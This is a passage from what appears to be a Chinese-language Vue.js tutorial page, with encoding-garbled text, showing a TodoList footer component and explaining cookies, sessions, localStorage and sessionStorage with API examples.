class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-footer&quot;</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;total&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot; :checked=&quot;isAll&quot; @change=&quot;checkAll&quot;/&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;isAll&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>å·²å®Œæˆ&#123;&#123; doneTotal &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> / å…¨éƒ¨&#123;&#123; total &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;clearAll&quot;</span>&gt;</span>æ¸…é™¤å·²å®Œæˆä»»åŠ¡<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;MyFooter&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">props</span>:[<span class="hljs-string">&#x27;todos&#x27;</span>,<span class="hljs-string">&#x27;checkAllTodo&#x27;</span>,<span class="hljs-string">&#x27;clearAllTodo&#x27;</span>],</span><br><span class="language-javascript">    <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// æ€»æ•°</span></span><br><span class="language-javascript">      <span class="hljs-title function_">total</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-property">length</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// å·²å®Œæˆæ•°</span></span><br><span class="language-javascript">      <span class="hljs-title function_">doneTotal</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">//æ­¤å¤„ä½¿ç”¨reduceæ–¹æ³•åšæ¡ä»¶ç»Ÿè®¡</span></span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">pre,todo</span>)=&gt;</span> pre + (todo.<span class="hljs-property">done</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) ,<span class="hljs-number">0</span>)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">// æ§åˆ¶å…¨é€‰æ¡†</span></span><br><span class="language-javascript">      <span class="hljs-attr">isAll</span>:&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">//å…¨é€‰æ¡†æ˜¯å¦å‹¾é€‰</span></span><br><span class="language-javascript">        <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">doneTotal</span> === <span class="hljs-variable language_">this</span>.<span class="hljs-property">total</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">total</span> &gt; <span class="hljs-number">0</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">//isAllè¢«ä¿®æ”¹æ—¶setè¢«è°ƒç”¨</span></span><br><span class="language-javascript">        <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>)&#123;</span><br><span class="language-javascript">          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkAllTodo</span>(value)</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">/* checkAll(e)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">this.checkAllTodo(e.target.checked)</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125; */</span></span><br><span class="language-javascript">      <span class="hljs-comment">//æ¸…ç©ºæ‰€æœ‰å·²å®Œæˆ</span></span><br><span class="language-javascript">      <span class="hljs-title function_">clearAll</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clearAllTodo</span>()</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*footer*/</span></span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> &#123;<span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<span class="hljs-attribute">padding-left</span>: <span class="hljs-number">6px</span>;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">label</span> &#123;<span class="hljs-attribute">display</span>: inline-block;<span class="hljs-attribute">margin-right</span>: <span class="hljs-number">20px</span>;<span class="hljs-attribute">cursor</span>: pointer;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">label</span> <span class="hljs-selector-tag">input</span> &#123;<span class="hljs-attribute">position</span>: relative;<span class="hljs-attribute">top</span>: -<span class="hljs-number">1px</span>;<span class="hljs-attribute">vertical-align</span>: middle;</span><br><span class="language-css">    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css">  <span class="hljs-selector-class">.todo-footer</span> <span class="hljs-selector-tag">button</span> &#123;<span class="hljs-attribute">float</span>: right;<span class="hljs-attribute">margin-top</span>: <span class="hljs-number">5px</span>;&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221117162252774.png" alt="image-20221117162252774"></p><h2 id="2-3-æµè§ˆå™¨æœ¬åœ°å­˜å‚¨"><a href="#2-3-æµè§ˆå™¨æœ¬åœ°å­˜å‚¨" class="headerlink" title="2.3 æµè§ˆå™¨æœ¬åœ°å­˜å‚¨"></a>2.3 æµè§ˆå™¨æœ¬åœ°å­˜å‚¨</h2><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookieæ˜¯æœ€æ—©è¢«æå‡ºæ¥çš„æœ¬åœ°å­˜å‚¨æ–¹å¼ï¼Œåœ¨æ­¤ä¹‹å‰ï¼ŒæœåŠ¡ç«¯æ˜¯æ— æ³•åˆ¤æ–­ç½‘ç»œä¸­çš„ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯åŒä¸€ç”¨æˆ·å‘èµ·çš„ï¼Œä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒCookieå°±å‡ºç°äº†ã€‚Cookieæ˜¯å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­çš„ä¸€æ®µä¸è¶…è¿‡ 4 KB çš„å­—ç¬¦ä¸²ã€‚å®ƒç”±ä¸€ä¸ªåç§°ï¼ˆNameï¼‰ã€ä¸€ä¸ªå€¼ï¼ˆValueï¼‰å’Œå…¶å®ƒå‡ ä¸ªç”¨ äºæ§åˆ¶ Cookieæœ‰æ•ˆæœŸã€å®‰å…¨æ€§ã€ä½¿ç”¨èŒƒå›´çš„å¯é€‰å±æ€§ç»„æˆã€‚ä¸åŒåŸŸåä¸‹çš„ Cookie å„è‡ªç‹¬ç«‹ï¼Œæ¯å½“å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šè‡ªåŠ¨æŠŠå½“å‰åŸŸåä¸‹æ‰€æœ‰æœªè¿‡æœŸçš„ Cookieä¸€åŒå‘é€åˆ°æœåŠ¡å™¨ã€‚</p><p><strong>Cookieçš„ç‰¹æ€§ ï¼š</strong></p><ul><li>Cookieä¸€æ—¦åˆ›å»ºæˆåŠŸï¼Œåç§°å°±æ— æ³•ä¿®æ”¹</li><li>Cookieæ˜¯æ— æ³•è·¨åŸŸåçš„ï¼Œä¹Ÿå°±æ˜¯è¯´aåŸŸåå’ŒbåŸŸåä¸‹çš„cookieæ˜¯æ— æ³•å…±äº«çš„ï¼Œè¿™ä¹Ÿæ˜¯ç”±Cookieçš„éšç§å®‰å…¨æ€§å†³å®šçš„ï¼Œè¿™æ ·å°±èƒ½å¤Ÿé˜»æ­¢éæ³•è·å–å…¶ä»–ç½‘ç«™çš„Cookie</li><li>æ¯ä¸ªåŸŸåä¸‹Cookieçš„æ•°é‡ä¸èƒ½è¶…è¿‡20ä¸ªï¼Œæ¯ä¸ªCookieçš„å¤§å°ä¸èƒ½è¶…è¿‡4kb</li><li>æœ‰å®‰å…¨é—®é¢˜ï¼Œå¦‚æœCookieè¢«æ‹¦æˆªäº†ï¼Œé‚£å°±å¯è·å¾—sessionçš„æ‰€æœ‰ä¿¡æ¯ï¼Œå³ä½¿åŠ å¯†ä¹Ÿäºäº‹æ— è¡¥ï¼Œæ— éœ€çŸ¥é“cookieçš„æ„ä¹‰ï¼Œåªè¦è½¬å‘cookieå°±èƒ½è¾¾åˆ°ç›®çš„</li><li>Cookieåœ¨è¯·æ±‚ä¸€ä¸ªæ–°çš„é¡µé¢çš„æ—¶å€™éƒ½ä¼šè¢«å‘é€è¿‡å»</li></ul><p><strong>Cookie åœ¨èº«ä»½è®¤è¯ä¸­çš„ä½œç”¨</strong></p><ul><li><p>å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨é€šè¿‡å“åº”å¤´çš„å½¢å¼ï¼Œå‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªèº«ä»½è®¤è¯çš„ Cookieï¼Œå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨ å°† Cookie ä¿å­˜åœ¨æµè§ˆå™¨ä¸­ã€‚</p></li><li><p>éšåï¼Œå½“å®¢æˆ·ç«¯æµè§ˆå™¨æ¯æ¬¡è¯·æ±‚æœåŠ¡å™¨çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†èº«ä»½è®¤è¯ç›¸å…³çš„ Cookieï¼Œé€šè¿‡è¯·æ±‚å¤´çš„å½¢å¼å‘é€ç»™ æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å³å¯éªŒæ˜å®¢æˆ·ç«¯çš„èº«ä»½ã€‚</p></li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/e29b7e0bef784bc5b6b8ed50b0d8a509.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>Cookie ä¸å…·æœ‰å®‰å…¨æ€§</strong></p><p>ç”±äº Cookie æ˜¯å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­çš„ï¼Œè€Œä¸”æµè§ˆå™¨ä¹Ÿæä¾›äº†è¯»å†™ Cookie çš„ APIï¼Œå› æ­¤ Cookie å¾ˆå®¹æ˜“è¢«ä¼ªé€ ï¼Œä¸å…·æœ‰å®‰å…¨æ€§ã€‚å› æ­¤ä¸å»ºè®®æœåŠ¡å™¨å°†é‡è¦çš„éšç§æ•°æ®ï¼Œé€šè¿‡ Cookie çš„å½¢å¼å‘é€ç»™æµè§ˆå™¨ã€‚</p><blockquote><p>æ³¨æ„ï¼šåƒä¸‡ä¸è¦ä½¿ç”¨ Cookie å­˜å‚¨é‡è¦ä¸”éšç§çš„æ•°æ®ï¼æ¯”å¦‚ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ã€å¯†ç ç­‰ã€‚</p></blockquote><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>Sessionæ˜¯å¦ä¸€ç§è®°å½•å®¢æˆ·çŠ¶æ€çš„æœºåˆ¶ï¼Œä¸åŒçš„æ˜¯Cookieä¿å­˜åœ¨å®¢æˆ·ç«¯æµè§ˆå™¨ä¸­ï¼Œè€ŒSessionä¿å­˜åœ¨æœåŠ¡å™¨ä¸Šã€‚å®¢æˆ·ç«¯æµè§ˆå™¨è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨æŠŠå®¢æˆ·ç«¯ä¿¡æ¯ä»¥æŸç§å½¢å¼è®°å½•åœ¨æœåŠ¡å™¨ä¸Šã€‚è¿™å°±æ˜¯Sessionã€‚å®¢æˆ·ç«¯æµè§ˆå™¨å†æ¬¡è®¿é—®æ—¶åªéœ€è¦ä»è¯¥Sessionä¸­æŸ¥æ‰¾è¯¥å®¢æˆ·çš„çŠ¶æ€å°±å¯ä»¥äº†sessionæ˜¯ä¸€ç§ç‰¹æ®Šçš„cookieã€‚cookieæ˜¯ä¿å­˜åœ¨å®¢æˆ·ç«¯çš„ï¼Œè€Œsessionæ˜¯ä¿å­˜åœ¨æœåŠ¡ç«¯ã€‚</p><p><strong>ä¸ºä»€ä¹ˆè¦ç”¨session</strong>  </p><p>ç”±äºcookieæ˜¯å­˜åœ¨ç”¨æˆ·ç«¯ï¼Œè€Œä¸”å®ƒæœ¬èº«å­˜å‚¨çš„å°ºå¯¸å¤§å°ä¹Ÿæœ‰é™ï¼Œæœ€å…³é”®æ˜¯ç”¨æˆ·å¯ä»¥æ˜¯å¯è§çš„ï¼Œå¹¶å¯ä»¥éšæ„çš„ä¿®æ”¹ï¼Œå¾ˆä¸å®‰å…¨ã€‚é‚£å¦‚ä½•åˆè¦å®‰å…¨ï¼Œåˆå¯ä»¥æ–¹ä¾¿çš„å…¨å±€è¯»å–ä¿¡æ¯å‘¢ï¼Ÿäºæ˜¯ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä¸€ç§æ–°çš„å­˜å‚¨ä¼šè¯æœºåˆ¶ï¼šsessionè¯ç”Ÿäº†</p><p><strong>sessionåŸç†</strong><br>å½“å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚æœåŠ¡å™¨çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä»½sessionä¿å­˜åœ¨æœåŠ¡ç«¯ï¼Œå°†è¯¥æ•°æ®(session)çš„idä»¥cookieçš„å½¢å¼ä¼ é€’ç»™å®¢æˆ·ç«¯ï¼›ä»¥åçš„æ¯æ¬¡è¯·æ±‚ï¼Œæµè§ˆå™¨éƒ½ä¼šè‡ªåŠ¨çš„æºå¸¦cookieæ¥è®¿é—®æœåŠ¡å™¨(sessionæ•°æ®id)ã€‚</p><blockquote><p>å›¾ç¤ºï¼š</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124154221400.png"></p><blockquote><p>sessionæˆ‘è§‰å¾—å¯ä»¥ç®€å•ç†è§£ä¸ºä¸€ä¸ªè¡¨ï¼Œæ ¹æ®cookieä¼ æ¥çš„å€¼æŸ¥è¯¢è¡¨ä¸­çš„å†…å®¹</p></blockquote><p><strong>session æ ‡å‡†å·¥ä½œæµç¨‹</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124154249377.png" alt="image-20221124154249377"></p><h3 id="WebStorageï¼ˆjs-æœ¬åœ°å­˜å‚¨ï¼‰"><a href="#WebStorageï¼ˆjs-æœ¬åœ°å­˜å‚¨ï¼‰" class="headerlink" title="WebStorageï¼ˆjs æœ¬åœ°å­˜å‚¨ï¼‰"></a>WebStorageï¼ˆjs æœ¬åœ°å­˜å‚¨ï¼‰</h3><p>å­˜å‚¨å†…å®¹å¤§å°ä¸€èˆ¬æ”¯æŒ <strong>5MB</strong> å·¦å³ï¼ˆä¸åŒæµè§ˆå™¨å¯èƒ½è¿˜ä¸ä¸€æ ·ï¼‰<br>æµè§ˆå™¨ç«¯é€šè¿‡Window.sessionStorageå’ŒWindow.localStorageå±æ€§æ¥å®ç°æœ¬åœ°å­˜å‚¨æœºåˆ¶<br>ç›¸å…³API</p><ul><li>xxxStorage.setItem(â€˜keyâ€™, â€˜valueâ€™)è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªé”®å’Œå€¼ä½œä¸ºå‚æ•°ï¼Œä¼šæŠŠé”®å€¼å¯¹æ·»åŠ åˆ°å­˜å‚¨ä¸­ï¼Œå¦‚æœé”®åå­˜åœ¨ï¼Œåˆ™æ›´æ–°å…¶å¯¹åº”çš„å€¼</li><li>xxxStorage.getItem(â€˜keyâ€™)è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªé”®åä½œä¸ºå‚æ•°ï¼Œè¿”å›é”®åå¯¹åº”çš„å€¼</li><li>xxxStorage.removeItem(â€˜keyâ€™)è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªé”®åä½œä¸ºå‚æ•°ï¼Œå¹¶æŠŠè¯¥é”®åä»å­˜å‚¨ä¸­åˆ é™¤</li><li>xxxStorage.clear()è¯¥æ–¹æ³•ä¼šæ¸…ç©ºå­˜å‚¨ä¸­çš„æ‰€æœ‰æ•°æ®</li></ul><blockquote><p>å¤‡æ³¨</p></blockquote><ul><li>SessionStorageå­˜å‚¨çš„å†…å®¹ä¼šéšç€æµè§ˆå™¨çª—å£å…³é—­è€Œæ¶ˆå¤±</li><li>LocalStorageå­˜å‚¨çš„å†…å®¹ï¼Œéœ€è¦æ‰‹åŠ¨æ¸…é™¤æ‰ä¼šæ¶ˆå¤±</li><li>xxxStorage.getItem(xxx)å¦‚æœ xxx å¯¹åº”çš„ value è·å–ä¸åˆ°ï¼Œé‚£ä¹ˆgetItem()çš„è¿”å›å€¼æ˜¯null</li><li>JSON.parse(null)çš„ç»“æœä¾ç„¶æ˜¯null</li></ul><h3 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h3><p>LocalStorageæ˜¯HTML5æ–°å¼•å…¥çš„ç‰¹æ€§ï¼Œç”±äºæœ‰çš„æ—¶å€™æˆ‘ä»¬å­˜å‚¨çš„ä¿¡æ¯è¾ƒå¤§ï¼ŒCookieå°±ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œè¿™æ—¶å€™LocalStorageå°±æ´¾ä¸Šç”¨åœºäº†ã€‚</p><p><strong>LocalStorageçš„ä¼˜ç‚¹ ï¼š</strong></p><ul><li>åœ¨å¤§å°æ–¹é¢ï¼ŒLocalStorageçš„å¤§å°ä¸€èˆ¬ä¸º5MBï¼Œå¯ä»¥å‚¨å­˜æ›´å¤šçš„ä¿¡æ¯</li><li>LocalStorageæ˜¯æŒä¹…å‚¨å­˜ï¼Œå¹¶ä¸ä¼šéšç€é¡µé¢çš„å…³é—­è€Œæ¶ˆå¤±ï¼Œé™¤éä¸»åŠ¨æ¸…ç†ï¼Œä¸ç„¶ä¼šæ°¸ä¹…å­˜åœ¨</li><li>ä»…å‚¨å­˜åœ¨æœ¬åœ°ï¼Œä¸åƒCookieé‚£æ ·æ¯æ¬¡HTTPè¯·æ±‚éƒ½ä¼šè¢«æºå¸¦</li></ul><p><strong>LocalStorageçš„ç¼ºç‚¹ ï¼š</strong></p><ul><li>å­˜åœ¨æµè§ˆå™¨å…¼å®¹é—®é¢˜ï¼ŒIE8ä»¥ä¸‹ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸æ”¯æŒ</li><li>å¦‚æœæµè§ˆå™¨è®¾ç½®ä¸ºéšç§æ¨¡å¼ï¼Œé‚£æˆ‘ä»¬å°†æ— æ³•è¯»å–åˆ°LocalStorage</li><li>LocalStorageå—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œå³ç«¯å£ã€åè®®ã€ä¸»æœºåœ°å€æœ‰ä»»ä½•ä¸€ä¸ªä¸ç›¸åŒï¼Œéƒ½ä¸ä¼šè®¿é—®</li></ul><p><strong>LocalStorageçš„å¸¸ç”¨API ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ä¿å­˜æ•°æ®åˆ° localStorage</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-comment">// ä» localStorage è·å–æ•°æ®</span><br><span class="hljs-keyword">let</span> data = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// ä» localStorage åˆ é™¤ä¿å­˜çš„æ•°æ®</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// ä» localStorage åˆ é™¤æ‰€æœ‰ä¿å­˜çš„æ•°æ®</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>();<br><br><span class="hljs-comment">// è·å–æŸä¸ªç´¢å¼•çš„Key</span><br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">key</span>(index)<br></code></pre></td></tr></table></figure><p><strong>LocalStorageçš„ä½¿ç”¨åœºæ™¯:</strong></p><ul><li>æœ‰äº›ç½‘ç«™æœ‰æ¢è‚¤çš„åŠŸèƒ½ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å°†æ¢è‚¤çš„ä¿¡æ¯å­˜å‚¨åœ¨æœ¬åœ°çš„LocalStorageä¸­ï¼Œå½“éœ€è¦æ¢è‚¤çš„æ—¶å€™ï¼Œç›´æ¥æ“ä½œLocalStorageå³å¯</li><li>åœ¨ç½‘ç«™ä¸­çš„ç”¨æˆ·æµè§ˆä¿¡æ¯ä¹Ÿä¼šå­˜å‚¨åœ¨LocalStorageä¸­ï¼Œè¿˜æœ‰ç½‘ç«™çš„ä¸€äº›ä¸å¸¸å˜åŠ¨çš„ä¸ªäººä¿¡æ¯ç­‰ä¹Ÿå¯ä»¥å­˜å‚¨åœ¨æœ¬åœ°çš„LocalStorageä¸­</li></ul><h3 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h3><p>SessionStorageå’ŒLocalStorageéƒ½æ˜¯åœ¨HTML5æ‰æå‡ºæ¥çš„å­˜å‚¨æ–¹æ¡ˆï¼ŒSessionStorage<br>ä¸»è¦ç”¨äºä¸´æ—¶ä¿å­˜åŒä¸€çª—å£(æˆ–æ ‡ç­¾é¡µ)çš„æ•°æ®ï¼Œåˆ·æ–°é¡µé¢æ—¶ä¸ä¼šåˆ é™¤ï¼Œå…³é—­çª—å£æˆ–æ ‡ç­¾é¡µä¹‹åå°†ä¼šåˆ é™¤è¿™äº›æ•°æ®ã€‚</p><p><strong>SessionStorageä¸LocalStorageå¯¹æ¯” ï¼š</strong></p><ul><li>SessionStorageå’ŒLocalStorageéƒ½åœ¨ <strong>æœ¬åœ°è¿›è¡Œæ•°æ®å­˜å‚¨</strong> ï¼›</li><li>SessionStorageä¹Ÿæœ‰åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œä½†æ˜¯SessionStorageæœ‰ä¸€æ¡æ›´åŠ ä¸¥æ ¼çš„é™åˆ¶ï¼ŒSessionStorage <strong>åªæœ‰åœ¨åŒä¸€æµè§ˆå™¨çš„åŒä¸€çª—å£ä¸‹æ‰èƒ½å¤Ÿå…±äº«</strong> ï¼›</li><li>LocalStorageå’ŒSessionStorage <strong>éƒ½ä¸èƒ½è¢«çˆ¬è™«çˆ¬å–</strong> ï¼›</li></ul><p><strong>SessionStorageçš„å¸¸ç”¨API ï¼š</strong></p>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ä¿å­˜æ•°æ®åˆ° sessionStorage</span><br>sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-comment">// ä» sessionStorage è·å–æ•°æ®</span><br><span class="hljs-keyword">let</span> data = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// ä» sessionStorage åˆ é™¤ä¿å­˜çš„æ•°æ®</span><br>sessionStorage.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">&#x27;key&#x27;</span>);<br><br><span class="hljs-comment">// ä» sessionStorage åˆ é™¤æ‰€æœ‰ä¿å­˜çš„æ•°æ®</span><br>sessionStorage.<span class="hljs-title function_">clear</span>();<br><br><span class="hljs-comment">// è·å–æŸä¸ªç´¢å¼•çš„Key</span><br>sessionStorage.<span class="hljs-title function_">key</span>(index)<br><br></code></pre></td></tr></table></figure><p><strong>SessionStorageçš„ä½¿ç”¨åœºæ™¯</strong></p><p>ç”±äºSessionStorageå…·æœ‰æ—¶æ•ˆæ€§ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥å­˜å‚¨ä¸€äº›ç½‘ç«™çš„æ¸¸å®¢ç™»å½•çš„ä¿¡æ¯ï¼Œè¿˜æœ‰ä¸´æ—¶çš„æµè§ˆè®°å½•çš„ä¿¡æ¯ã€‚å½“å…³é—­ç½‘ç«™ä¹‹åï¼Œè¿™äº›ä¿¡æ¯ä¹Ÿå°±éšä¹‹æ¶ˆé™¤äº†ã€‚</p><blockquote><p>å…·ä½“æ¡ˆä¾‹ï¼š</p></blockquote><p><strong>localStorage</strong></p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span 